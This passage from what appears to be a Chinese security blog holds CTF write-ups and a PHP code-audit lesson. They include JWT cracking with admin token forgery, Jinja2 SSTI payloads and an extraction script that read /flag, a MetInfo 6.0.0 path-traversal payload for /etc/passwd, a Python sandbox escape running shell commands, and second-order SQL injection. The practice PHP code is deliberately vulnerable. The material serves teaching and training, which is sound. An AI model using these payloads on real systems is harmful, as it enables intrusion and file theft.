<p><img src="/img/2018网鼎杯第三场/21.png" alt="21"></p>
<h3 id="mmmmy"><a href="#mmmmy" class="headerlink" title="mmmmy"></a>mmmmy</h3><p>题目：find the flag.</p>
<p><img src="/img/2018网鼎杯第三场/22.png" alt="22"></p>
<p>抓包发现又是python的web程序，使用了JWT：(随手用test/test登录即可看到)</p>
<p><img src="/img/2018网鼎杯第三场/23.png" alt="23"></p>
<p>使用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener"><strong>c-jwt-cracker</strong></a> 爆破 <strong>secret key</strong> ：</p>
<p><img src="/img/2018网鼎杯第三场/24.png" alt="24"></p>
<p>发现只有 <strong>admin</strong> 才能用留言板功能，所以 <strong>伪造admin的token</strong> 登录：</p>
<p><img src="/img/2018网鼎杯第三场/25.png" alt="25"></p>
<p><strong>virink</strong> 师傅提醒说留言板处存在 <strong>SSTI</strong> ，于是测试了下，果然存在，只不过过滤了双花括号的写法，那我们可以换成流程控制结构的写法 <strong>执行语句</strong> ，测试如下：</p>
<p><img src="/img/2018网鼎杯第三场/26.png" alt="26"></p>
<p><img src="/img/2018网鼎杯第三场/27.png" alt="27"></p>
<p>那么后面的数据就要盲注出来了，使用的 <strong>payload</strong> 类似如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;%  if open('/flag','r').read()[0]=='f' %&#125;1&#123;%  else  %&#125;0&#123;%  endif  %&#125;</span><br></pre></td></tr></table></figure>
<p>这里实际上过滤了单、双引号，我们可以使用以下payload进行绕过：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0]%&#125;good&#123;%endif%&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=/flag&amp;e=&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/28.png" alt="28"></p>
<p>getflag程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,sys</span><br><span class="line">url = <span class="string">"http://4532bc69bc734acd8416204f0aa04f446e9d38024c5644e8.game.ichunqiu.com/bbs"</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"token"</span> : <span class="string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"</span></span><br><span class="line">&#125;</span><br><span class="line">chars = <span class="string">"&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(chars)):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"text"</span> : <span class="string">"&#123;%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d]%%&#125;getflag&#123;%%endif%%&#125;"</span> % (j,i),</span><br><span class="line">            <span class="string">"a"</span> : <span class="string">"__class__"</span>,</span><br><span class="line">            <span class="string">"b"</span> : <span class="string">"__base__"</span>,</span><br><span class="line">            <span class="string">"c"</span> : <span class="string">"__subclasses__"</span>,</span><br><span class="line">            <span class="string">"d"</span> : <span class="string">"/flag"</span>,</span><br><span class="line">            <span class="string">"e"</span> : chars</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'getflag'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chars[j]</span><br><span class="line">            sys.stdout.write(<span class="string">"[+] "</span>+ flag + <span class="string">'\r'</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">if</span> chars[j] == <span class="string">'&#125;'</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(len(r.text))</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第三场/29.png" alt="29"></p>
<p>PS：在交流的过程中，发现可以不用盲注，直接使用 <strong>jinjia2</strong> 的 <strong>print</strong> 即可打印出 <strong>flag</strong> 。</p>
<p><img src="/img/2018网鼎杯第三场/30.png" alt="30"></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/08/25/代码审计Day9 - str_replace函数过滤不当/">代码审计Day9 - str_replace函数过滤不当</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-25
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第9篇</strong> 代码审计文章：</p>
<h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><p>题目叫做兔子，代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/1.png" alt="1"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>这一题考察的是一个 <strong>str_replace</strong> 函数过滤不当造成的任意文件包含漏洞。在上图代码 <strong>第18行</strong> 处，程序仅仅只是将 <strong>../</strong> 字符替换成空，这并不能阻止攻击者进行攻击。例如攻击者使用payload：<strong>….//</strong> 或者 <strong>…/./</strong> ，在经过程序的 <strong>str_replace</strong> 函数处理后，都会变成 <strong>../</strong> ，所以上图程序中的 <strong>str_replace</strong> 函数过滤是有问题的。我们来看一下PHP手册对 <strong>str_replace</strong> 函数的具体定义：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.str-replace.php" target="_blank" rel="noopener"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：子字符串替换</p>
<p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code> </p>
<p>该函数返回一个字符串或者数组。如下：</p>
<p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p>
<p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p>
<p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p>
</blockquote>
<p><img src="/img/PHP-Audit-Labs/Day9/2.png" alt="2"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>本次实例分析，我们选取的是 <strong>Metinfo 6.0.0</strong> 版本。漏洞文件在 <strong>app/system/include/module/old_thumb.class.php</strong> 中，我们发现程序将变量 <strong>$dir</strong> 中出现的 <strong>../</strong> 和 <strong>./</strong> 字符替换成空字符串（下图第6行处），猜想开发者应该是有考虑到路径穿越问题，所以做了此限制。具体代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/3.png" alt="3"></p>
<p>接着在第8行处，用 <strong>strstr</strong> 函数判断 <strong>$dir</strong> 变量中是否含有 <strong>http</strong> 字符串，如果有，则读取加载 <strong>$dir</strong> 变量，并以图片方式显示出来。这里猜测开发者的意图是，加载远程图片。关于 <strong>strstr</strong> 函数，定义如下：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.strstr.php" target="_blank" rel="noopener"> strstr </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：查找字符串的首次出现</p>
<p><strong>定义</strong> ： <code>string strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] )</code> </p>
<p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;domain = strstr(<span class="string">'hongrisec@gmail.com'</span>, <span class="string">'@'</span>);</span><br><span class="line">&gt;<span class="comment">// 上面输出：@gmail.com</span></span><br><span class="line">&gt;user = strstr(<span class="string">'hongrisec@gmail.com, '</span>@<span class="string">', true); // 从 PHP 5.3.0 起</span></span><br><span class="line"><span class="string">&gt;// 上面输出：hongrisec</span></span><br><span class="line"><span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>然而这段代码是可以绕过的，例如我们使用 <strong>payload：…..///http/…..///…..///…..///…..///etc/passwd</strong> ，过滤后实际就变成： <strong>../http/../../../../etc/passwd</strong> ，效果如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/4.png" alt="4"></p>
<p><img src="/img/PHP-Audit-Labs/Day9/5.png" alt="5"></p>
<p>接下来，我们要做的就是搜索程序在哪里调用了这个文件。用 <strong>phpstorm</strong> 加载整个项目文件，按住 <code>Ctrl+Shift+F</code> 键，搜索关键词 <strong>old_thumb</strong> ，发现在 <strong>include/thumb.php</strong> 文件中调用 <strong>old_thumb</strong> 类，搜索结果如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/6.png" alt="6"></p>
<p>我们在 <strong>include/thumb.php</strong> 文件中，可以看到 <strong>M_CLASS</strong> 定义为 <strong>old_thumb</strong> ，而 <strong>M_ACTION</strong> 定义为 <strong>doshow</strong> 。我们接着跟进到 <strong>app/system/entrance.php</strong> 文件中，在该文件的末尾可以看包含了 <strong>app/system/include/class/load.class.php</strong> 文件，引入了 <strong>load</strong> 类，然后调用了 <strong>load</strong> 类的 <strong>module</strong> 方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/system/include/class/load.class.php</span></span><br><span class="line"><span class="keyword">require_once</span> PATH_SYS_CLASS.<span class="string">'load.class.php'</span>;</span><br><span class="line">load::module();</span><br></pre></td></tr></table></figure>
<p>我们跟进 <strong>module</strong> 方法，并查看各个变量的赋值情况( <strong>app/system/include/class/load.class.php</strong> 文件)：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/7.png" alt="7"></p>
<p>上图程序最后调用了 <strong>load</strong> 类的 <strong>_load_class</strong> 方法，我们跟进该方法，详细代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/8.png" alt="8"></p>
<p>可以看到上图代码第16行处实例化了一个 <strong>old_thumb</strong> 类对象，然后在第25行处调用了 <strong>old_thumb</strong> 类的 <strong>doshow</strong> 方法， <strong>doshow</strong> 方法中的 <strong>$dir</strong> 变量就是用户可以控制的。以上便是完整的攻击过程分析，下面我们看看具体如何进行攻击。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>实际上攻击的话就很简单了，因为 <strong>$dir</strong> 变量是直接通过 <strong>GET请求</strong> 获取的，然后用 <strong>str_replace</strong> 方法处理，而 <strong>str_replace</strong> 方法处理又有问题，所以我们构造 <strong>payload</strong> 如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/metInfo/include/thumb.php?dir=.....///http/.....///最终用户授权许可协议.txt</span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/Day9/9.png" alt="9"></p>
<p>成功读取 <strong>最终用户授权许可协议.txt</strong> 文件。</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>关于修复建议，这里先抛出个问题给大家，针对这个案例，下面的修复代码是否可行？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir = str_replace(<span class="keyword">array</span>(<span class="string">'..'</span>,<span class="string">'//'</span>), <span class="string">''</span>, $_GET[<span class="string">'dir'</span>]);</span><br></pre></td></tr></table></figure>
<p>咋一看，这个代码好像完美地修复了路径穿越问题，但是，我们在修复代码的时候一定要结合实际情况。比如在metinfo中，程序这里原来的功能是加载远程图片，使用上面的修复代码，会导致正常的图片链接无法加载，这种修复肯定是无效的。这里给出我的修复代码，如下图：</p>
<p><img src="/img/PHP-Audit-Labs/Day9/10.png" alt="10"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对 <strong>str_replace()</strong> 函数过滤路径符号有了更加深入的理解，文中用到的CMS可以从 <a href="https://www.metinfo.cn/upload/file/MetInfo6.0.0.zip" target="_blank" rel="noopener">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:**hongrisec@gmail.com" target="_blank" rel="noopener">**hongrisec@gmail.com</a><strong> 联系我们。</strong>Day9** 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername,$username,$password,$dbname);</span><br><span class="line"><span class="keyword">if</span>($conn-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'连接数据库失败'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $id = $row[<span class="string">'COUNT(*)'</span>] + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]) &amp;&amp; $_POST[<span class="string">'msg'</span>] !==<span class="string">''</span>)&#123;</span><br><span class="line">    $msg = addslashes($_POST[<span class="string">'msg'</span>]);</span><br><span class="line">    $msg = replace_bad_word(convert($msg));</span><br><span class="line">    $sql = <span class="string">"INSERT INTO users VALUES($id,'"</span>.$msg.<span class="string">"')"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($conn-&gt;error) <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type="text" name="msg" /&gt;&lt;input type="submit" value="Submit" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_row())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $limit_words;</span><br><span class="line">    <span class="keyword">foreach</span> ($limit_words <span class="keyword">as</span> $old =&gt; $new) &#123;</span><br><span class="line">        strlen($old) &gt; <span class="number">2</span> &amp;&amp; $str = str_replace($old,trim($new),$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$limit_words = <span class="keyword">array</span>(<span class="string">'造反'</span> =&gt; <span class="string">'造**'</span>, <span class="string">'法轮功'</span> =&gt; <span class="string">'法**'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$method <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"hongrisec"</span>;</span><br><span class="line">$password = <span class="string">"hongrisec"</span>;</span><br><span class="line">$dbname = <span class="string">"day9"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day9;</span><br><span class="line"><span class="keyword">use</span> day9;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">integer</span> auto_increment <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span>,</span><br><span class="line">message <span class="built_in">varchar</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag( flag <span class="built_in">varchar</span>(<span class="number">40</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> flag <span class="keyword">values</span>(<span class="string">'HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'</span>);</span><br></pre></td></tr></table></figure>
<p>题解我们会阶段性放出，如果大家有什么好的解法，可以在文章底下留言，祝大家玩的愉快！</p>
<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="http://badcode.cc/2018/05/26/Metinfo-6-0-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Metinfo 6.0.0 任意文件读取漏洞</a> </p>
<p><a href="https://paper.seebug.org/676/" target="_blank" rel="noopener">MetInfo 任意文件读取漏洞的修复与绕过</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/08/23/2018网鼎杯第二场Web题解/">2018网鼎杯第二场Web题解</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-23
        </span>
        
          <div class="post-category">
            
              <a href="/categories/CTF竞赛训练/">CTF竞赛训练</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>题目如下，这是一个计算器，可以执行一些简单的算式。题目提示正则有问题，所以正则应该是可以绕过的。</p>
<p><img src="/img/2018网鼎杯第二场/1.png" alt="1"></p>
<p>我们先看看服务器端使用的是什么语言，简单测试发现是 <strong>python web</strong> ，就考虑是否存在 <strong>SSTI</strong> ，绕过正则执行 <strong>python</strong> 代码。</p>
<p><img src="/img/2018网鼎杯第二场/2.png" alt="2"></p>
<p>我们先来分析一下正则表达式： <strong>^[0-9.]+\s*[*+-/]\s*[0-9.]+</strong> 。这个正则存在多个问题：</p>
<ul>
<li><p>第一个地方： <strong>[*+-/]</strong> </p>
<p>实际上短杆 <strong>-</strong> 在方括号中有特殊的含义，表示范围。 <strong>[*+-/]</strong> 这个正则实际上包含了以下字符：</p>
<p><img src="/img/2018网鼎杯第二场/3.png" alt="3"></p>
</li>
<li><p>第二个地方：</p>
<p>正则表达式末尾的加号 <strong>+</strong> 并不严谨，严谨的写法应该在加号后面添加一个 <strong>$</strong> 符号，表示输入的字符串以数字结尾，变成这样 <strong>^[0-9.]+\s*[*+-/]\s*[0-9.]+$</strong> </p>
</li>
</ul>
<p>使用 <strong>payload</strong> 如下：（百度python沙箱逃逸，第一个文章中就有payload）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>,().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/flag'</span>).read()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第二场/4.png" alt="4"></p>
<p>查看源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>,().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'fun'</span>+<span class="string">'c_glo'</span>+<span class="string">'bal'</span>+<span class="string">'s'</span>)[<span class="string">'lin'</span>+<span class="string">'eca'</span>+<span class="string">'che'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'cat /usr/local/lib/python2.7/dist-packages/tornado/web.py'</span>).read()</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第二场/5.png" alt="5"></p>
<p>这里猜测一下后台代码的执行过程：</p>
<ul>
<li><p>先用正则对用户的输入进行匹配</p>
</li>
<li><p>如果正则匹配不为空，则将用户的输入直接传递到后台模板文件中；否则不执行</p>
</li>
<li><p>当然这里有对用户的输入进行一些过滤</p>
</li>
</ul>
<p>而我们传入的 <code>1+1,python语句</code> 实际上是一个元组，传到后台模板中类似 <code></code> </p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>题目如下</p>
<p><img src="/img/2018网鼎杯第二场/6.png" alt="6"></p>
<p>发现就一个登陆页面，于是尝试探测是否存在 <strong>register.php</strong> 注册页面。发现存在，立即注册登陆，并查看。</p>
<p><img src="/img/2018网鼎杯第二场/7.png" alt="7"></p>
<p>登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 <strong>二次注入</strong> 。</p>
<p><img src="/img/2018网鼎杯第二场/8.png" alt="8"></p>
<p>还有一个点就是，我们抓取注册账号的数据包，一直重放数据包会发现返回的状态码都是 <strong>200</strong> ，这里就有可能存在 <strong>update注入</strong> ，之后发现并没有更新用户信息，所以应该不存在 <strong>update注入</strong> 。那我们就针对用户名部分，进行二次注入测试。</p>
<p>注册成功，会得到 <strong>302</strong> 状态码并跳转至 <strong>login.php</strong> ；如果注册失败，只会返回 <strong>200</strong> 状态码。所以构造 <strong>payload</strong> 如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=test@666.com&amp;username=0'%2B(select hex(hex(database())))%2B'0&amp;password=test</span><br></pre></td></tr></table></figure>
<p><img src="/img/2018网鼎杯第二场/9.png" alt="9"></p>
<p>进行两次hex解码后得到数据库名为web：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"373736353632"</span>.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'web'</span></span><br></pre></td></tr></table></figure>
<p>至于为什么 <strong>payload</strong> 要进行两次 <strong>hex</strong> 加密，看下面这张图就明白了。</p>
<p><img src="/img/2018网鼎杯第二场/10.png" alt="10"></p>
<p>然后这里还要注意一个问题，就是当数据进过 <strong>两次hex</strong> 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，如下：</p>
<p><img src="/img/2018网鼎杯第二场/11.png" alt="11"></p>
<p>所以这里我们使用 <strong>substr</strong> 每次取10个字符长度与 <strong>‘0’</strong> 相加，这样就不会丢失数据。但是这里使用逗号 <strong>,</strong> 会出错，所以可以使用类似 <strong>substr(‘test’ from 1 for 10)</strong> 这种写法来绕过，具体获取 <strong>flag</strong> 的payload如下：</p>
